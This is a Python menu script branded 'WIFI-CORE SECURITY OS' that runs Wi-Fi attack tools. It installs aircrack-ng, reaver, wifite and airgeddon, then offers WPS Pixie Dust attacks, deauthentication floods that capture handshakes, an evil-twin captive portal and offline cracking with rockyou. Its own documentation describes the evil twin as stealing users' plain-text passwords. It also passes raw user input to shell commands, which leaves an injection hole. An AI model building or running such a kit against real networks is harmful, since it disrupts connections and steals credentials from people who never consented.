# coding: utf-8
import os
import sys
import time
import subprocess

# --- STYLING (Classic Terminal) ---
G = "\033[32m"  # Green
R = "\033[31m"  # Red
Y = "\033[33m"  # Yellow
B = "\033[34m"  # Blue
W = "\033[0m"   # White/Reset

def header():
    os.system("clear")
    print(f"""{G}
    ██╗    ██╗██╗███████╗██╗     ██████╗ ██████╗ ███████╗
    ██║    ██║██║██╔════╝██║    ██╔════╝██╔═══██╗██╔════╝
    ██║ █╗ ██║██║█████╗  ██║    ██║     ██║   ██║█████╗  
    ██║███╗██║██║██╔══╝  ██║    ██║     ██║   ██║██╔══╝  
    ╚███╔███╔╝██║██║     ██║    ╚██████╗╚██████╔╝███████╗
     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝     ╚═════╝ ╚═════╝ ╚══════╝
    {B}>> WIFI-CORE SECURITY OS [Version 2.2-STABLE]{W}""")

def progress_bar(current, total, pkg_name):
    width = 30
    progress = int(width * current / total)
    bar = "█" * progress + "-" * (width - progress)
    sys.stdout.write(f"\r{Y}[INSTALLING]{W} |{bar}| {current}/{total} {pkg_name} ".ljust(60))
    sys.stdout.flush()

def install_system():
    header()
    print(f"\n{B}[*] INITIALIZING REPOSITORY CHECK...{W}\n")
    
    # Mapping tool to menu options for failure reporting
    packages = {
        "aircrack-ng": ["1", "2", "4", "6"],
        "xterm": ["4", "5"],
        "reaver": ["3"],
        "pixiewps": ["3"],
        "bully": ["3"],
        "wifite": ["2"],
        "airgeddon": ["5"],
        "hostapd": ["5"],
        "dnsmasq": ["5"],
        "crunch": ["6"]
    }
    
    failed_tools = []
    total = len(packages)
    
    for i, (pkg, options) in enumerate(packages.items(), 1):
        progress_bar(i, total, pkg)
        # Attempt installation
        result = subprocess.run(["sudo", "apt-get", "install", "-y", pkg], 
                                capture_output=True, text=True)
        if result.returncode != 0:
            failed_tools.append((pkg, options))
    
    print("\n")
    
    if failed_tools:
        print(f"{R}[!] INSTALLATION COMPLETED WITH ERRORS{W}")
        print("-" * 60)
        print(f"{'PACKAGE':<15} | {'DEGRADED OPTIONS':<20}")
        print("-" * 60)
        for pkg, opts in failed_tools:
            print(f"{pkg:<15} | {', '.join(opts):<20}")
        print("-" * 60)
        print(f"{Y}[WARNING]{W} Some features will fail. Check internet connection.")
    else:
        print(f"{G}[+] ALL PACKAGES INSTALLED SUCCESSFULLY.{W}")
        # Fix rockyou path
        if os.path.exists("/usr/share/wordlists/rockyou.txt.gz"):
            os.system("sudo gzip -d /usr/share/wordlists/rockyou.txt.gz")
    
    input(f"\n{G}Press Enter to return to OS...{W}")

def get_docs():
    header()
    print(f"{B}--- SYSTEM WORKFLOW DOCUMENTATION ---{W}")
    print(f"\n{G}[DEAUTH ATTACK - OPTION 4]{W}")
    print(f"Tool: {Y}aireplay-ng{W}")
    print(f"Workflow: Floods target device with deauthentication frames.")
    print(f"Outcome: Forces device to disconnect. On auto-reconnect, we sniff")
    print(f"the 4-Way Handshake required for offline cracking.")
    
    print(f"\n{G}[EVIL TWIN - OPTION 5]{W}")
    print(f"Tool: {Y}Airgeddon (dnsmasq/hostapd){W}")
    print(f"Workflow: 1. Clones Target SSID. 2. Deauths Real AP.")
    print(f"3. Redirects users to a Captive Portal (Fake login page).")
    print(f"Outcome: Steals plain-text password from the user.")
    input(f"\n{B}Press Enter to return...{W}")

def main_menu():
    header()
    print(f"""
 {G}(1){W} Monitor Mode (Start/Stop)   {G}(5){W} EVIL TWIN (Captive Portal)
 {G}(2){W} Scan Networks (Airodump)    {G}(6){W} Crack Handshake (Offline)
 {G}(3){W} WPS Attack (Pixie Dust)     {G}(7){W} Tool Docs & Workflow
 {G}(4){W} Capture Handshake (Deauth)  {G}(8){W} Repair/Install System
 
 {R}(00){W} Shutdown System
-------------------------------------------------------""")
    
    cmd = input(f"{G}wifi-os{W}@{B}root{W}:~$ ").strip()

    if cmd == "1":
        print(f"\n{B}1. Start Monitor Mode | 2. Stop Monitor Mode{W}")
        m = input("Choice: ")
        interface = input("Enter Interface (e.g., wlan0): ")
        if m == "1":
            os.system(f"sudo airmon-ng start {interface} && sudo airmon-ng check kill")
        else:
            os.system(f"sudo airmon-ng stop {interface} && sudo service network-manager restart")
        main_menu()

    elif cmd == "2":
        iface = input("Enter Monitor Interface: ")
        print(f"{Y}[!] Scanning... Press CTRL+C to stop.{W}")
        time.sleep(2)
        os.system(f"sudo airodump-ng {iface}")
        main_menu()

    elif cmd == "3":
        iface = input("Enter Monitor Interface: ")
        bssid = input("Target BSSID: ")
        os.system(f"sudo reaver -i {iface} -b {bssid} -K")
        main_menu()

    elif cmd == "4":
        iface = input("Monitor Interface: ")
        bssid = input("Target BSSID: ")
        chan = input("Channel: ")
        name = input("Output Filename: ")
        # Open deauth in one window, capture in another
        os.system(f"xterm -geometry 80x20+0+0 -hold -T 'CAPTURE' -e 'airodump-ng -c {chan} --bssid {bssid} -w {name} {iface}' &")
        os.system(f"xterm -geometry 80x10+0+500 -hold -T 'DEAUTH' -e 'aireplay-ng -0 20 -a {bssid} {iface}' &")
        main_menu()

    elif cmd == "5":
        os.system("sudo airgeddon")
        main_menu()

    elif cmd == "6":
        cap = input("Path to .cap file: ")
        word = input("Path to wordlist (Default /usr/share/wordlists/rockyou.txt): ")
        if not word: word = "/usr/share/wordlists/rockyou.txt"
        os.system(f"aircrack-ng {cap} -w {word}")
        input("Press Enter to continue...")
        main_menu()

    elif cmd == "7":
        get_docs()
        main_menu()

    elif cmd == "8":
        install_system()
        main_menu()

    elif cmd == "00":
        print(f"{R}Shutting down systems...{W}")
        sys.exit()

    else:
        print(f"{R}Error: Command not found.{W}")
        time.sleep(1)
        main_menu()

if __name__ == "__main__":
    if os.getuid() != 0:
        print(f"{R}[!] ERROR: This OS requires root. Use 'sudo python3 [file]'.{W}")
        sys.exit()
    main_menu()
